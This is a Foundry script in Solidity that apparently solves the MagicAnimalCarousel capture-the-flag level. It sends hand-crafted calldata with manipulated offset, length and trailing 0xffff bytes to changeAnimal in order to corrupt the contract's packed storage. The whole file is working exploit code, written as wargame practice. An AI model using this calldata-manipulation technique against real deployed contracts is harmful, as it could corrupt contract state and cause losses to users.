// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;
import "forge-std/Script.sol";
import "src/levels/MagicAnimalCarousel/MagicAnimalCarousel.sol";

contract MagicAnimalCarouselAttackScript is Script {
    function setUp() public {}

    function run() public {
        MagicAnimalCarousel target = MagicAnimalCarousel(0x0000000000000000000000000000000000000000); // Insert target target address

        vm.startBroadcast();
        target.setAnimalAndSpin("Echidna");
        bytes memory payload = abi.encodePacked(uint256(64), uint256(1), uint256(12), hex"31323334353637383930ffff");
        (bool success, ) = address(target).call(abi.encodePacked(target.changeAnimal.selector, payload));
        target.setAnimalAndSpin("Pidgeon");
        vm.stopBroadcast();
    }
}